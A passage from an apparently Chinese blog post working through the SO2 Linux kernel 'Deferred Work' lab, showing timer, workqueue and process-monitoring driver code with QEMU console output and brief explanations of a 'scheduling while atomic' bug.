*tl)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">/* TODO 1: print a message */</span></span><br><span class="line">	<span class="keyword">static</span> <span class="keyword">int</span> message = <span class="number">0</span>;</span><br><span class="line">	pr_info(<span class="string">&quot;message :%d\n&quot;</span>,message++);</span><br><span class="line">	<span class="comment">/* TODO 2: rechedule timer */</span></span><br><span class="line">	mod_timer(&amp;timer, jiffies + TIMER_TIMEOUT * HZ);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __init <span class="title">timer_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	pr_info(<span class="string">&quot;[timer_init] Init module\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* TODO 1: initialize timer */</span></span><br><span class="line">	timer_setup(&amp;timer, timer_handler, <span class="number">0</span>);</span><br><span class="line">	<span class="comment">/* TODO 1: schedule timer for the first time */</span></span><br><span class="line">	mod_timer(&amp;timer, jiffies + TIMER_TIMEOUT * HZ);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> __exit <span class="title">timer_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	pr_info(<span class="string">&quot;[timer_exit] Exit module\n&quot;</span>);</span><br><span class="line">	<span class="comment">/* TODO 1: cleanup; make sure the timer is not running after we exit */</span></span><br><span class="line">	del_timer_sync(&amp;timer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(timer_init);</span><br><span class="line">module_exit(timer_exit);</span><br></pre></td></tr></table></figure>
<ul>
<li>结果：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@qemux86:~/skels/deferred_work/<span class="number">1</span><span class="number">-2</span>-timer<span class="meta"># insmod timer.ko                   </span></span><br><span class="line">timer: loading out-of-tree <span class="keyword">module</span> taints kernel.                                </span><br><span class="line">[timer_init] Init <span class="keyword">module</span>                                                        </span><br><span class="line">root@qemux86:~/skels/deferred_work/<span class="number">1</span><span class="number">-2</span>-timer<span class="meta"># message :0                        </span></span><br><span class="line">message :<span class="number">1</span>                                                                      </span><br><span class="line">message :<span class="number">2</span>                                                                      </span><br><span class="line">message :<span class="number">3</span>                                                                      </span><br><span class="line">message :<span class="number">4</span>   </span><br></pre></td></tr></table></figure>
<ul>
<li>在定时器处理程序中还可以调用定时器，这样就可以实现定时循环</li>
</ul>
<p>2.Deferred 完整代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * SO2 - Lab 6 - Deferred Work</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Exercises #3, #4, #5: deferred work</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Code skeleton.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/cdev.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/slab.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/uaccess.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sched/task.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;../include/deferred.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MY_MAJOR		42</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MY_MINOR		0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MODULE_NAME		<span class="meta-string">&quot;deferred&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TIMER_TYPE_NONE		-1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TIMER_TYPE_SET		0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TIMER_TYPE_ALLOC	1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TIMER_TYPE_MON		2</span></span><br><span class="line"></span><br><span class="line">MODULE_DESCRIPTION(<span class="string">&quot;Deferred work character device&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;SO2&quot;</span>);</span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mon_proc</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">task</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">my_device_data</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">cdev</span> <span class="title">cdev</span>;</span></span><br><span class="line">	<span class="comment">/* TODO 1: add timer */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">timer_list</span> <span class="title">timer</span>;</span></span><br><span class="line">	<span class="comment">/* TODO 2: add flag */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> flag;</span><br><span class="line">	<span class="comment">/* TODO 3: add work */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">work</span>;</span></span><br><span class="line">	<span class="comment">/* TODO 4: add list for monitored processes */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">	<span class="comment">/* TODO 4: add spinlock to protect list */</span></span><br><span class="line">	<span class="keyword">spinlock_t</span> lock;</span><br><span class="line">&#125; dev;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">alloc_io</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	set_current_state(TASK_INTERRUPTIBLE);</span><br><span class="line">	schedule_timeout(<span class="number">5</span> * HZ);</span><br><span class="line">	pr_info(<span class="string">&quot;Yawn! I&#x27;ve been sleeping for 5 seconds.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct mon_proc *<span class="title">get_proc</span><span class="params">(<span class="keyword">pid_t</span> pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">task</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mon_proc</span> *<span class="title">p</span>;</span></span><br><span class="line"></span><br><span class="line">	rcu_read_lock();</span><br><span class="line">	task = pid_task(find_vpid(pid), PIDTYPE_PID);</span><br><span class="line">	rcu_read_unlock();</span><br><span class="line">	<span class="keyword">if</span> (!task)</span><br><span class="line">		<span class="keyword">return</span> ERR_PTR(-ESRCH);</span><br><span class="line"></span><br><span class="line">	p = kmalloc(<span class="keyword">sizeof</span>(*p), GFP_ATOMIC);</span><br><span class="line">	<span class="keyword">if</span> (!p)</span><br><span class="line">		<span class="keyword">return</span> ERR_PTR(-ENOMEM);</span><br><span class="line"></span><br><span class="line">	get_task_struct(task);</span><br><span class="line">	p-&gt;task = task;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* TODO 3: define work handler */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">work_handler</span><span class="params">(struct work_struct *work)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	alloc_io();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ALLOC_IO_DIRECT</span></span><br><span class="line"><span class="comment">/* TODO 3: undef ALLOC_IO_DIRECT*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> ALLOC_IO_DIRECT</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">timer_handler</span><span class="params">(struct timer_list *tl)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">/* TODO 1: implement timer handler */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">my_device_data</span> *<span class="title">my_data</span> =</span> from_timer(my_data, tl, timer);</span><br><span class="line">	pr_info(<span class="string">&quot;[timer_handler] pid = %d, comm = %s\n&quot;</span>,</span><br><span class="line">		current-&gt;pid, current-&gt;comm);</span><br><span class="line">	<span class="comment">/* TODO 2: check flags: TIMER_TYPE_SET or TIMER_TYPE_ALLOC */</span></span><br><span class="line">	<span class="keyword">switch</span> (my_data-&gt;flag) &#123;</span><br><span class="line">		<span class="keyword">case</span> TIMER_TYPE_SET:</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> TIMER_TYPE_ALLOC:</span><br><span class="line">			<span class="comment">// alloc_io();</span></span><br><span class="line">		<span class="comment">/* TODO 3: schedule work */</span></span><br><span class="line">			schedule_work(&amp;my_data-&gt;work);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="comment">/* TODO 4: iterate the list and check the proccess state */</span></span><br><span class="line">		<span class="keyword">case</span> TIMER_TYPE_MON:</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">mon_proc</span> *<span class="title">p</span>, *<span class="title">n</span>;</span></span><br><span class="line">			spin_lock(&amp;my_data-&gt;lock);</span><br><span class="line">			<span class="comment">/* TODO 4: if task is dead print info ... */</span></span><br><span class="line">			<span class="comment">/* TODO 4: ... decrement task usage counter ... */</span></span><br><span class="line">			<span class="comment">/* TODO 4: ... remove it from the list ... */</span></span><br><span class="line">			<span class="comment">/* TODO 4: ... free the struct mon_proc */</span></span><br><span class="line">			list_for_each_entry_safe(p, n, &amp;my_data-&gt;<span class="built_in">list</span>, <span class="built_in">list</span>)&#123;</span><br><span class="line">				<span class="keyword">if</span> (p-&gt;task-&gt;state == TASK_DEAD) &#123;</span><br><span class="line">					pr_info(<span class="string">&quot;task %s (%d) is dead\n&quot;</span>, p-&gt;task-&gt;comm,</span><br><span class="line">						p-&gt;task-&gt;pid);</span><br><span class="line">					put_task_struct(p-&gt;task);</span><br><span class="line">					list_del(&amp;p-&gt;<span class="built_in">list</span>);</span><br><span class="line">					kfree(p);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			spin_unlock(&amp;my_data-&gt;lock);</span><br><span class="line"></span><br><span class="line">			mod_timer(&amp;my_data-&gt;timer, jiffies + HZ);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">deferred_open</span><span class="params">(struct inode *inode, struct file *file)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">my_device_data</span> *<span class="title">my_data</span> =</span></span><br><span class="line">		container_of(inode-&gt;i_cdev, struct my_device_data, cdev);</span><br><span class="line">	file-&gt;private_data = my_data;</span><br><span class="line">	pr_info(<span class="string">&quot;[deferred_open] Device opened\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">deferred_release</span><span class="params">(struct inode *inode, struct file *file)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	pr_info(<span class="string">&quot;[deferred_release] Device released\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">deferred_ioctl</span><span class="params">(struct file *file, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">my_device_data</span> *<span class="title">my_data</span> =</span> (struct my_device_data*) file-&gt;private_data;</span><br><span class="line"></span><br><span class="line">	pr_info(<span class="string">&quot;[deferred_ioctl] Command: %s\n&quot;</span>, ioctl_command_to_string(cmd));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">		<span class="keyword">case</span> MY_IOCTL_TIMER_SET:</span><br><span class="line">			<span class="comment">/* TODO 2: set flag */</span></span><br><span class="line">			my_data-&gt;flag = TIMER_TYPE_SET;</span><br><span class="line">			<span class="comment">/* TODO 1: schedule timer */</span></span><br><span class="line">			mod_timer(&amp;dev.timer,jiffies + arg * HZ);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> MY_IOCTL_TIMER_CANCEL:</span><br><span class="line">			<span class="comment">/* TODO 1: cancel timer */</span></span><br><span class="line">			del_timer_sync(&amp;dev.timer);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> MY_IOCTL_TIMER_ALLOC:</span><br><span class="line">			<span class="comment">/* TODO 2: set flag and schedule timer */</span></span><br><span class="line">			my_data-&gt;flag = TIMER_TYPE_ALLOC;</span><br><span class="line">			mod_timer(&amp;dev.timer,jiffies + arg * HZ);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> MY_IOCTL_TIMER_MON:</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">/* TODO 4: use get_proc() and add task to list */</span></span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">mon_proc</span> *<span class="title">p</span> =</span> get_proc(current-&gt;pid);</span><br><span class="line">			<span class="comment">/* TODO 4: protect access to list */</span></span><br><span class="line">			spin_lock_bh(&amp;my_data-&gt;lock);</span><br><span class="line">			list_add(&amp;p-&gt;<span class="built_in">list</span>,&amp;my_data-&gt;<span class="built_in">list</span>);</span><br><span class="line">			spin_unlock_bh(&amp;my_data-&gt;lock);</span><br><span class="line">			<span class="comment">/* TODO 4: set flag and schedule timer */</span></span><br><span class="line">			my_data-&gt;flag = TIMER_TYPE_MON;</span><br><span class="line">			mod_timer(&amp;my_data-&gt;timer,jiffies + arg * HZ);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="keyword">return</span> -ENOTTY;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">my_fops</span> =</span> &#123;</span><br><span class="line">	.owner = THIS_MODULE,</span><br><span class="line">	.open = deferred_open,</span><br><span class="line">	.release = deferred_release,</span><br><span class="line">	.unlocked_ioctl = deferred_ioctl,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">deferred_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">	pr_info(<span class="string">&quot;[deferred_init] Init module\n&quot;</span>);</span><br><span class="line">	err = register_chrdev_region(MKDEV(MY_MAJOR, MY_MINOR), <span class="number">1</span>, MODULE_NAME);</span><br><span class="line">	<span class="keyword">if</span> (err) &#123;</span><br><span class="line">		pr_info(<span class="string">&quot;[deffered_init] register_chrdev_region: %d\n&quot;</span>, err);</span><br><span class="line">		<span class="keyword">return</span> err;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* TODO 2: Initialize flag. */</span></span><br><span class="line">	dev.flag = TIMER_TYPE_NONE;</span><br><span class="line">	<span class="comment">/* TODO 3: Initialize work. */</span></span><br><span class="line">	INIT_WORK(&amp;dev.work, work_handler);</span><br><span class="line">	<span class="comment">/* TODO 4: Initialize lock and list. */</span></span><br><span class="line">	spin_lock_init(&amp;dev.lock);</span><br><span class="line">	INIT_LIST_HEAD(&amp;dev.<span class="built_in">list</span>);</span><br><span class="line"></span><br><span class="line">	cdev_init(&amp;dev.cdev, &amp;my_fops);</span><br><span class="line">	cdev_add(&amp;dev.cdev, MKDEV(MY_MAJOR, MY_MINOR), <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* TODO 1: Initialize timer. */</span></span><br><span class="line">	timer_setup(&amp;dev.timer,timer_handler,<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">deferred_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mon_proc</span> *<span class="title">p</span>, *<span class="title">n</span>;</span></span><br><span class="line"></span><br><span class="line">	pr_info(<span class="string">&quot;[deferred_exit] Exit module\n&quot;</span> );</span><br><span class="line"></span><br><span class="line">	cdev_del(&amp;dev.cdev);</span><br><span class="line">	unregister_chrdev_region(MKDEV(MY_MAJOR, MY_MINOR), <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* TODO 1: Cleanup: make sure the timer is not running after exiting. */</span></span><br><span class="line">	del_timer_sync(&amp;dev.timer);</span><br><span class="line">	<span class="comment">/* TODO 3: Cleanup: make sure the work handler is not scheduled. */</span></span><br><span class="line">	flush_scheduled_work();</span><br><span class="line">	<span class="comment">/* TODO 4: Cleanup the monitered process list */</span></span><br><span class="line">	list_for_each_entry_safe(p, n, &amp;dev.<span class="built_in">list</span>, <span class="built_in">list</span>) &#123;</span><br><span class="line">		<span class="comment">/* TODO 4: ... decrement task usage counter ... */</span></span><br><span class="line">		<span class="comment">/* TODO 4: ... remove it from the list ... */</span></span><br><span class="line">		<span class="comment">/* TODO 4: ... free the struct mon_proc */</span></span><br><span class="line">		put_task_struct(p-&gt;task);</span><br><span class="line">		list_del(&amp;p-&gt;<span class="built_in">list</span>);</span><br><span class="line">		kfree(p);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(deferred_init);</span><br><span class="line">module_exit(deferred_exit);</span><br></pre></td></tr></table></figure>
<ul>
<li>结果：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@qemux86:~/skels/deferred_work/<span class="number">3</span><span class="number">-4</span><span class="number">-5</span>-deferred<span class="meta"># insmod ./kernel/deferred.ko  </span></span><br><span class="line">deferred: loading out-of-tree <span class="keyword">module</span> taints kernel.                             </span><br><span class="line">[deferred_init] Init <span class="keyword">module</span> </span><br><span class="line">root@qemux86:~/skels/deferred_work/<span class="number">3</span><span class="number">-4</span><span class="number">-5</span>-deferred<span class="meta"># mknod /dev/deferred c 42 0</span></span><br><span class="line">root@qemux86:~/skels/deferred_work/<span class="number">3</span><span class="number">-4</span><span class="number">-5</span>-deferred# ./user/test a <span class="number">3</span>              </span><br><span class="line">[deferred_open] Device opened                                                   </span><br><span class="line">Allocate memory after <span class="number">3</span> seconds                                                 </span><br><span class="line">[deferred_ioctl] Command: Allocate memory                                       </span><br><span class="line">[deferred_release] Device released                                              </span><br><span class="line">root@qemux86:~/skels/deferred_work/<span class="number">3</span><span class="number">-4</span><span class="number">-5</span>-deferred# [timer_handler] pid = <span class="number">0</span>, com0</span><br><span class="line">BUG: scheduling <span class="keyword">while</span> atomic: swapper/<span class="number">0</span>/<span class="number">0</span>/<span class="number">0x00000102</span>  </span><br></pre></td></tr></table></figure>
<ul>
<li>驱动程序导致错误，因为在原子上下文中调用了阻塞函数 <code>alloc_io</code>（计时器处理程序运行中断上下文）</li>
<li>但是 <code>schedule_work(&amp;my_data-&gt;work)</code> 中，使用工作队列新开一个内核线程来运行 <code>alloc_io</code> 就不会报错（这也是工作队列的优势）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@qemux86:~/skels/deferred_work/<span class="number">3</span><span class="number">-4</span><span class="number">-5</span>-deferred# ./user/test p <span class="number">3</span>              </span><br><span class="line">[deferred_open] Device opened                                                   </span><br><span class="line">Monitor PID <span class="number">3.</span>                                                                  </span><br><span class="line">[deferred_ioctl] Command: Monitor pid                                           </span><br><span class="line">[deferred_release] Device released                                              </span><br><span class="line">root@qemux86:~/skels/deferred_work/<span class="number">3</span><span class="number">-4</span><span class="number">-5</span>-deferred# [timer_handler] pid = <span class="number">0</span>, com0</span><br><span class="line">task test (<span class="number">239</span>) is dead                                                         </span><br><span class="line">[timer_handler] pid = <span class="number">0</span>, comm = swapper/<span class="number">0</span>                                       </span><br><span class="line">[timer_handler] pid = <span class="number">0</span>, comm = swapper/<span class="number">0</span>   </span><br></pre></td></tr></table></figure>
<ul>
<li>正常打印进程信息</li>
</ul>
<p>3.Kthread 完整代码：</p>
<ul>
<li>实现一个简单的模块，该模块会创建用于显示当前进程标识符的内核线程</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 